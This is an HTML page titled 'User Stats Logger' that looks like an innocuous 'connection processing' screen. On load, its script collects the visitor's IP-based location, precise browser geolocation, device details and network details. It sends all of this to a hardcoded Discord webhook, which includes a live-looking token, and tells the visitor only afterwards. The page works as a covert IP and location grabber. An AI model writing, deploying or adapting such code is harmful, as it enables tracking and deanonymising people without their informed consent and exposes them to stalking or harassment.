<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>User Stats Logger</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #2c2f33;
      color: #fff;
    }
    .container {
      text-align: center;
      background: rgba(35, 39, 42, 0.9);
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Welcome!</h1>
    <p>Your connection is being processed...</p>
  </div>

  <script>
    const webhookUrl = 'https://discordapp.com/api/webhooks/1335664944028582000/c1CoPiNgVyekogi0OhqJQizguoBFy5XmTKydzmWb-8XQFOYEAZ_PyT79OgkQsc1ElmGl';

    async function fetchIPInfo() {
      try {
        const response = await fetch('https://ipapi.co/json/');
        return response.ok ? await response.json() : null;
      } catch (error) {
        console.error('Error fetching IP info:', error);
        return null;
      }
    }

    async function fetchGeolocation() {
      return new Promise((resolve) => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              resolve({
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
              });
            },
            (error) => {
              console.error('Geolocation error:', error);
              resolve(null);
            }
          );
        } else {
          resolve(null);
        }
      });
    }

    async function fetchDeviceStats() {
      return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        viewportSize: `${window.innerWidth}x${window.innerHeight}`,
        cookiesEnabled: navigator.cookieEnabled,
        cores: navigator.hardwareConcurrency || 'Unknown',
        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
      };
    }

    async function fetchNetworkStats() {
      if (navigator.connection) {
        return {
          networkType: navigator.connection.effectiveType,
          downlinkSpeed: `${navigator.connection.downlink} Mbps`,
          latency: `${navigator.connection.rtt} ms`,
          saveData: navigator.connection.saveData,
        };
      }
      return null;
    }

    async function sendToWebhook(data) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: `**User Stats:**\n${data}` }),
        });
      } catch (error) {
        console.error('Error sending to webhook:', error);
      }
    }

    async function collectAndSendStats() {
      const ipInfo = await fetchIPInfo();
      const geolocation = await fetchGeolocation();
      const deviceStats = await fetchDeviceStats();
      const networkStats = await fetchNetworkStats();

      const stats = {
        IP_Info: ipInfo || 'Unavailable',
        Geolocation: geolocation || 'Unavailable',
        Device_Stats: deviceStats,
        Network_Stats: networkStats || 'Unavailable',
      };

      const formattedStats = JSON.stringify(stats, null, 2);
      console.log('Collected Stats:', stats);

      // Send to Discord Webhook
      await sendToWebhook(`\`\`\`json\n${formattedStats}\n\`\`\``);

      document.querySelector('p').textContent = 'Your stats have been logged!';
    }

    // Collect and send stats on page load
    collectAndSendStats();
  </script>
</body>
</html>
